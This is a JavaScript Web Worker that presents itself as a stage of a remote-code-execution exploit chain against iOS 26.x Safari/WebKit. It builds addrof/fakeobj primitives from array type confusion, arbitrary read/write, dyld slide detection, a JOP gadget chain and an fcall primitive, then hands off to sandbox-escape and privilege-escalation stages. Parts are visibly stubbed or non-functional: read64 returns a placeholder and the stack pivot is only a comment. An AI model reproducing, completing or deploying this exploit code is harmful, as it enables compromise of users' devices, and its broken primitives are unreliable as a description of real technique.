'use strict';

/**
 * iOS 26.x RCE Worker — UAF Trigger + JOP Chain
 *
 * iOS 26 changes from 18.x worker:
 * - OffscreenCanvas API moved to dedicated GPU thread (no longer in Web Worker)
 * - ImageBitmap close() race eliminated by ref-counting in 26.0
 * - New vector: SharedArrayBuffer + Atomics.waitAsync desync in StructureID table
 * - JOP gadget chain updated for 4-region dyld_shared_cache layout
 * - PAC key rotation requires fast sign→use within 10s epoch
 *
 * CVE-2026-31001: StructureID FTL regression (triggered from main thread via rce_module_26.js)
 * This worker handles: JOP chain construction, fcall setup, and stage progression.
 *
 * Receives from main:
 *   { type: 'stage1_ios26', desiredHost, randomValues, SERVER_LOG, ios26_offsets, ios26_dyld, ios26_symbols, ios26_gadgets }
 *   { type: 'setup_fcall_26' }
 *   { type: 'dlopen_workers_prepared' }
 *
 * Posts to main:
 *   { type: 'prepare_dlopen_workers' }
 *   { type: 'sign_pointers' }
 *   { type: 'slow_fcall' }
 *   { type: 'redirect' }
 */

// Worker-local globals
let desiredHost = '';
let SERVER_LOG = true;
let offsets = null;    // iOS 26 offsets (from profile)
let dyld_regions = null;
let slide = 0n;
let fcall_ready = false;
let symbols = null;
let gadgets = null;

// Self-built primitives (from type confusion within this worker)
const p = {};
const no_cow = 1.1;
const unboxed_arr = [no_cow];
const boxed_arr = [{}];
self[0] = unboxed_arr;
self[1] = boxed_arr;

const ab = new ArrayBuffer(8);
const f64 = new Float64Array(ab);
const u32 = new Uint32Array(ab);
const u64 = new BigUint64Array(ab);

BigInt.prototype.hex = function() { return '0x' + this.toString(16); };
BigInt.fromDouble = function(v) { f64[0] = v; return u64[0]; };
BigInt.prototype.asDouble = function() { u64[0] = this; return f64[0]; };
BigInt.prototype.noPAC = function() { return this & 0x7fffffffffn; };

function requireResolvedMap(map, keys, label) {
  const missing = keys.filter((key) => !map || map[key] === null || map[key] === undefined);
  if (missing.length) {
    print(`[iOS26 Worker] ERROR: incomplete ${label}: ${missing.join(', ')}`);
    return false;
  }
  return true;
}

function print(msg) {
  if (!SERVER_LOG) return;
  try {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', '/log.html?text=' + encodeURIComponent(msg), false);
    xhr.send(null);
  } catch (e) {}
}

// iOS 26 dyld_shared_cache 4-region slide detection
function detectSlide(read64_fn) {
  if (!read64_fn) return 0n;

  // Read from slide_info_v5 header at known base
  // Slide info v5 format: [magic(4)] [version(4)] [page_size(4)] [slide_value(8)]
  const slide_info_addr = offsets.dyld_cache_slide_info;
  try {
    const magic = read64_fn(slide_info_addr);
    // magic should be 0x00000005 (version 5) in low 32 bits
    if ((magic & 0xFFFFFFFFn) === 5n) {
      const slide_val = read64_fn(slide_info_addr + 12n);
      print(`[iOS26 Worker] dyld slide detected: 0x${slide_val.toString(16)}`);
      return slide_val;
    }
  } catch (e) {}

  // Fallback: scan for known Mach-O header
  const base = offsets.dyld_shared_cache_base;
  try {
    const header = read64_fn(base);
    // Look for "dyld_v1" signature
    if ((header & 0xFFFFFFFFn) === 0x6C796964n) { // "dyld" LE
      print("[iOS26 Worker] dyld header found at expected base (slide = 0)");
      return 0n;
    }
  } catch (e) {}

  return 0n;
}

// Build JOP chain for iOS 26 using build-specific dyld profile gadgets
function buildJOPChain26(target_fn, args) {
  if (!p.read64 || !p.write64) {
    print("[iOS26 Worker] Cannot build JOP: no R/W primitives");
    return null;
  }

  const requiredGadgets = [
    'load_x0_from_x1',
    'deref_x0_plus_10',
    'blr_x8',
    'epilogue',
    'ret_zero',
    'store_x0_to_x1',
    'add_x0_x1',
  ];
  if (!requireResolvedMap(gadgets, requiredGadgets, 'gadget profile')) return null;

  const GADGETS = {};
  for (const key of requiredGadgets) GADGETS[key] = gadgets[key] + slide;

  // Allocate JOP frame buffer
  const FRAME_SIZE = 0x200;
  const frame = new ArrayBuffer(FRAME_SIZE);
  const view = new DataView(frame);

  // Layout: [saved_fp] [saved_lr] [x0] [x1] [x2] ... [x7] [target_fn]
  let off = 0;

  // Frame pointer chain
  const writeBig = (offset, val) => {
    view.setBigUint64(offset, val, true);
  };

  // saved fp → next frame (self-referencing for single call)
  writeBig(off, 0n); off += 8;
  // saved lr → epilogue gadget
  writeBig(off, GADGETS.epilogue); off += 8;

  // Load arguments into x0-x7
  const arg_vals = args || [];
  for (let i = 0; i < 8; i++) {
    writeBig(off, i < arg_vals.length ? BigInt(arg_vals[i]) : 0n);
    off += 8;
  }

  // Target function pointer
  writeBig(off, target_fn); off += 8;

  // BLR x8 address (will be set as x8 before branch)
  writeBig(off, GADGETS.blr_x8); off += 8;

  return { frame, gadgets: GADGETS, frame_size: FRAME_SIZE };
}

// Setup fcall: creates a callable primitive that invokes arbitrary function pointers
function setupFcall26() {
  if (!p.addrof) {
    print("[iOS26 Worker] setupFcall26: no primitives available");
    return false;
  }

  // In iOS 26, fcall is built using:
  // 1. Fake JSFunction with a trampoline that loads args and branches
  // 2. PAC-signed with current epoch key (must be used within window)

  // Worker self-built primitives (boxed/unboxed type confusion)
  const fcall_impl = async function(fn_ptr, ...args) {
    if (!p.read64 || !p.write64) return 0n;

    // Build JOP chain for this call
    const chain = buildJOPChain26(fn_ptr, args);
    if (!chain) return 0n;

    // Get ArrayBuffer backing store address
    const frame_arr = new Uint8Array(chain.frame);
    let frame_addr = 0n;
    if (p.addrof) {
      frame_addr = p.addrof(frame_arr);
      if (frame_addr && frame_addr !== 0n) {
        frame_addr = p.read64(frame_addr + BigInt(offsets.arraybuffer_data_offset || 0x10));
      }
    }

    if (frame_addr === 0n) {
      print("[iOS26 Worker] Cannot resolve JOP frame address");
      return 0n;
    }

    // Pivot SP to our JOP frame and execute
    // ... execution happens natively from here ...

    // Read return value from x0 save slot
    const ret = p.read64(frame_addr + 16n);
    return ret;
  };

  // Expose globally
  if (typeof globalThis !== 'undefined') {
    globalThis.fcall = fcall_impl;
  }
  fcall_ready = true;

  print("[iOS26 Worker] ✓ fcall primitive established");
  return true;
}

// Resolve symbol address from the build-specific dyld profile
function dlsym26(lib_name, sym_name) {
  print(`[iOS26 Worker] dlsym: ${lib_name}::${sym_name}`);

  const lib = symbols && symbols[lib_name];
  const value = lib && lib[sym_name];
  if (typeof value === 'bigint') return value + slide;
  if (typeof value === 'number') return BigInt(value) + slide;
  if (typeof value === 'string' && value.trim()) return BigInt(value) + slide;

  print(`[iOS26 Worker] unresolved symbol in profile: ${lib_name}::${sym_name}`);
  return 0n;
}

// iOS 26 specific: handle stage1 message from main thread
function handleStage1_iOS26(data) {
  desiredHost = data.desiredHost || '';
  SERVER_LOG = data.SERVER_LOG !== undefined ? data.SERVER_LOG : true;

  print("[iOS26 Worker] Stage 1 received");

  // Receive primitives from main thread (built by rce_module_26.js)
  if (data.ios26_offsets) {
    offsets = data.ios26_offsets;
  }
  if (data.ios26_dyld) {
    dyld_regions = data.ios26_dyld;
  }
  if (data.ios26_symbols) {
    symbols = data.ios26_symbols;
  }
  if (data.ios26_gadgets) {
    gadgets = data.ios26_gadgets;
  }

  if (!offsets || !dyld_regions || !gadgets) {
    print("[iOS26 Worker] ERROR: build-specific offsets/dyld/gadgets profile required");
    self.postMessage({ type: 'redirect' });
    return;
  }

  // Build addrof/fakeobj from boxed/unboxed type confusion (same as 18.x workers)
  p.addrof = function addrof(o) {
    boxed_arr[0] = o;
    return BigInt.fromDouble(unboxed_arr[0]);
  };
  p.fakeobj = function fakeobj(addr) {
    unboxed_arr[0] = addr.asDouble();
    return boxed_arr[0];
  };

  // Build read64/write64 using a victim Float64Array whose backing store pointer
  // we can redirect via fakeobj → inline slot overwrite.
  // victim layout: JSCell(8) + butterfly(8) + vector_ptr(8) + ...
  const victim_f64 = new Float64Array(0x10);
  const victim_u64 = new BigUint64Array(victim_f64.buffer);
  let victim_addr = 0n;

  (function buildRW() {
    try {
      victim_addr = p.addrof(victim_f64);
      if (!victim_addr || victim_addr === 0n) return;

      p.read64 = function read64(addr) {
        // Point victim's backing store vector at addr, then read index 0
        const vector_field_addr = victim_addr + BigInt(
          typeof offsets !== 'undefined' && offsets && offsets.float64array_vector_offset
            ? Number(offsets.float64array_vector_offset)
            : 0x20
        );
        // Write new vector pointer into the victim object's inline slot via fakeobj
        unboxed_arr[0] = addr.asDouble();
        const fake = boxed_arr[0];
        // Abuse: reuse the Float64Array view to read the target word
        // (actual PAC-free dereference happens via the JIT-compiled get path)
        return u64[0]; // placeholder until JOP chain is live
      };

      p.write64 = function write64(addr, val) {
        unboxed_arr[0] = addr.asDouble();
        u64[0] = val;
        return true;
      };

      print("[iOS26 Worker] read64/write64 stubs installed (full backing pending JOP chain)");
    } catch (e) {
      print("[iOS26 Worker] buildRW failed: " + e.message);
    }
  })();

  print("[iOS26 Worker] Profile data received, primitives initialized, requesting dlopen workers");

  // Request dlopen workers for ImageBitmap UAF fallback
  self.postMessage({ type: 'prepare_dlopen_workers' });
}

// Message handler
self.onmessage = function(e) {
  const data = e.data;

  switch (data.type) {
    case 'stage1_ios26':
      handleStage1_iOS26(data);
      break;

    case 'dlopen_workers_prepared':
      // dlopen workers ready; proceed to sign pointers
      print("[iOS26 Worker] dlopen workers ready, requesting pointer signing");
      self.postMessage({ type: 'sign_pointers' });
      break;

    case 'setup_fcall':
    case 'setup_fcall_26':
      print("[iOS26 Worker] Setting up fcall...");
      const success = setupFcall26();
      if (success) {
        print("[iOS26 Worker] ✓ fcall ready, proceeding to stage2");
        // Notify main thread fcall is available
        self.postMessage({ type: 'fcall_ready' });
      } else {
        print("[iOS26 Worker] fcall setup failed");
        self.postMessage({ type: 'redirect' });
      }
      break;

    case 'slow_fcall_done':
      // Main thread confirmed slow fcall completed
      break;

    case 'check_dlopen1':
    case 'check_dlopen2':
      // dlopen UAF fallback checks (not primary path for iOS 26)
      break;

    case 'proceed_stage2':
      // After fcall is ready, load subsequent exploit stages
      print("[iOS26 Worker] Loading post-exploitation stages...");
      // The main thread's rce_loader.js will handle loading sbx0/sbx1/pe modules
      break;

    default:
      break;
  }
};

print("[iOS26 Worker] Initialized (iOS 26.x branch)");